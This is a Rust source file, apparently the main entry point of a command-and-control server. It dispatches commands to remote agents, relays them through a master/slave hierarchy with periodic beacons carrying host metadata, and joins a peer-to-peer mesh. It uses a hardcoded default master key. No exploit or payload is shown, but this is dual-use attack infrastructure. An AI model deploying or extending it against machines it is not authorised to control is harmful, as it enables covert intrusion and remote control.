//! C2 Server - Command & Control Server
//!
//! Handles agent connections, command dispatch, and result collection.
//! The server can also act as a slave to a higher-level master and as a P2P node.

use std::path::PathBuf;
use std::sync::Arc;

use c2_system::common::{AgentMetadata, AgentRole, BeaconMessage, C2Config};
use c2_system::server::{serve, ServerState};
use chrono::Utc;
use clap::Parser;
use tokio::time::{sleep, Duration};
use tracing::{error, info, warn};
use uuid::Uuid;

#[derive(Parser, Debug)]
#[command(name = "c2-server")]
#[command(about = "C2 Server for agent management (can also act as slave/node)")]
struct Args {
    /// Config file path
    #[arg(short, long, default_value = "config/server.toml")]
    config: String,

    /// Bind address
    #[arg(short, long, default_value = "0.0.0.0:8080")]
    bind: String,

    /// Master key for envelope encryption (must match agents)
    #[arg(long, default_value = "default_master_key")]
    master_key: String,

    /// Log level
    #[arg(short, long, default_value = "info")]
    log_level: String,

    /// Role: master, slave, node, or hybrid
    #[arg(long, default_value = "hybrid")]
    role: String,

    /// Master server URL (if acting as slave)
    #[arg(long)]
    master_server: Option<String>,

    /// State file for persistence (empty disables persistence)
    #[arg(long, default_value = "c2-state.json")]
    state: String,

    /// Enable P2P node mode
    #[arg(long)]
    p2p_enabled: bool,

    /// P2P bootstrap nodes
    #[arg(long)]
    p2p_bootstrap: Vec<String>,
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = Args::parse();

    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::from_default_env()
                .add_directive(args.log_level.parse()?),
        )
        .init();

    let role = match args.role.as_str() {
        "master" => AgentRole::Master,
        "slave" => AgentRole::Slave,
        "node" => AgentRole::Node,
        _ => AgentRole::Hybrid,
    };

    // Validate the config file when present; defaults cover the rest.
    let mut config = if std::path::Path::new(&args.config).exists() {
        let text = std::fs::read_to_string(&args.config)?;
        toml::from_str::<C2Config>(&text)?
    } else {
        C2Config::default()
    };
    config.server.master_key = args.master_key.clone();
    config.server.bind_address = args.bind.parse()?;

    let state_file = if args.state.is_empty() {
        None
    } else {
        Some(PathBuf::from(&args.state))
    };

    info!("Starting C2 Server (role: {:?}, bind: {})", role, args.bind);

    let state = Arc::new(
        ServerState::new(
            args.master_key.clone(),
            role.clone(),
            args.master_server.clone(),
            state_file,
        )
        .load()
        .await,
    );

    if matches!(role, AgentRole::Slave | AgentRole::Hybrid) {
        if let Some(master_url) = args.master_server.clone() {
            let state = state.clone();
            tokio::spawn(async move { run_slave_beacon(state, master_url).await });
        }
    }

    if args.p2p_enabled {
        let state = state.clone();
        let bootstrap = args.p2p_bootstrap.clone();
        tokio::spawn(async move { run_p2p_node(state, bootstrap).await });
    }

    let addr = args.bind.parse()?;
    serve(state, addr).await?;
    Ok(())
}

/// Beacon to a higher-level master, and mirror any commands it sends back to local agents.
async fn run_slave_beacon(state: Arc<ServerState>, master_url: String) {
    let agent_id = state.master_id().unwrap_or_else(Uuid::new_v4);
    let interval = Duration::from_secs(30);
    let client = reqwest::Client::new();
    let beacon_url = format!("{}/beacon", master_url.trim_end_matches('/'));

    info!("Starting slave beacon to master: {}", master_url);

    loop {
        let beacon = BeaconMessage {
            agent_id,
            timestamp: Utc::now(),
            uptime: 0,
            last_seen: Utc::now(),
            capabilities: vec!["server".to_string(), "relay".to_string()],
            metadata: Some(AgentMetadata {
                hostname: "c2-server".to_string(),
                username: "daemon".to_string(),
                os: std::env::consts::OS.to_string(),
                arch: std::env::consts::ARCH.to_string(),
                pid: std::process::id(),
                parent_pid: 1,
                working_dir: std::env::current_dir()
                    .map(|p| p.to_string_lossy().to_string())
                    .unwrap_or_default(),
                environment: None,
                role: state.role().clone(),
                master_id: state.master_id(),
                connected_nodes: state.peer_ids().await,
            }),
        };

        match client.post(&beacon_url).json(&beacon).send().await {
            Ok(resp) if resp.status().is_success() => {
                info!("Slave beacon sent successfully");
            }
            Ok(resp) => warn!("Slave beacon rejected: {}", resp.status()),
            Err(e) => warn!("Slave beacon failed: {}", e),
        }

        sleep(interval).await;
    }
}

/// P2P mesh node; bootstraps libp2p and logs peers.
async fn run_p2p_node(state: Arc<ServerState>, bootstrap_nodes: Vec<String>) {
    use c2_system::protocols::{P2PChannel, P2PChannelConfig};

    let config = P2PChannelConfig {
        enabled: true,
        bootstrap_nodes,
        ..Default::default()
    };
    let channel = P2PChannel::new(config);

    if let Err(e) = channel.start().await {
        error!("P2P node failed to start: {}", e);
        return;
    }

    let heartbeat = Duration::from_secs(30);
    loop {
        info!(
            "P2P node heartbeat (peers: {}, id: {:?})",
            channel.peer_count().await,
            channel.local_peer_id()
        );
        for peer_id in channel.peer_ids().await {
            let uuid = Uuid::new_v5(&Uuid::NAMESPACE_OID, peer_id.as_bytes());
            state.set_peer(uuid, peer_id).await;
        }
        sleep(heartbeat).await;
    }
}
